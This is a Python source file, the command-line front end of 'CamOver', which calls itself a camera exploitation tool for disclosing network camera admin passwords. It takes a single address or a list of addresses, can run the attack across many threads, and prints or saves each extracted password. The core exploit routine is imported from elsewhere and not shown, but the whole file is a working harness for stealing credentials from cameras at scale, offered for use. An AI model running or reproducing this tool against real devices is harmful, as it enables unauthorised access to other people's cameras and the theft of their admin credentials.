#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import argparse
import threading

from .__main__ import CamOver
from .badges import Badges


class CamOverCLI(CamOver, Badges):
    description = "CamOver is a camera exploitation tool that allows to disclosure network camera admin password."
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('--threads', dest='threads', action='store_true', help='Use threads for fastest work.')
    parser.add_argument('--output', dest='output', help='Output result to file.')
    parser.add_argument('--input', dest='input', help='Input file of addresses.')
    parser.add_argument('--address', dest='address', help='Single address.')
    args = parser.parse_args()

    def hack(self, host):
        self.print_process(f"({host}) - connecting to camera...")
        response = self.connect(host)

        if response is not None:
            self.print_process(f"({host}) - accessing camera config...")
            password = self.exploit(response)

            if password is not None:
                self.print_process(f"({host}) - extracting admin password...")
                return f"({host}) - password: {password}"
            self.print_error(f"({host}) - config access denied!")
            return None
        self.print_error(f"({host}) - connection rejected!")
        return None

    def thread(self, number, host):
        self.print_process(f"Initializing thread #{str(number)}...")
        result = self.hack(host)
        if result:
            if not self.args.output:
                self.print_success(result)
            else:
                with open(self.args.output, 'a') as f:
                    f.write(f"{result}\n")
        self.print_information(f"Thread #{str(number)} completed.")
        
    def start(self):
        if self.args.input:
            with open(self.args.input, 'r') as f:
                lines = f.read().strip().split('\n')
                line_number = 0
                for line in lines:
                    if not self.args.threads:
                        result = self.hack(line)
                        if result:
                            if not self.args.output:
                                self.print_success(result)
                            else:
                                with open(self.args.output, 'a') as f:
                                    f.write(f"{result}\n")
                    else:
                        process = threading.Thread(target=self.thread, args=[line_number, line])
                        process.start()
                    line_number += 1
        elif self.args.address:
            result = self.hack(self.args.address)
            if result:
                if not self.args.output:
                    self.print_success(result)
                else:
                    with open(self.args.output, 'a') as f:
                        f.write(f"{result}\n")
        else:
            self.print_error("No list or address specified!")

def main():
    cli = CamOverCLI()
    cli.start()
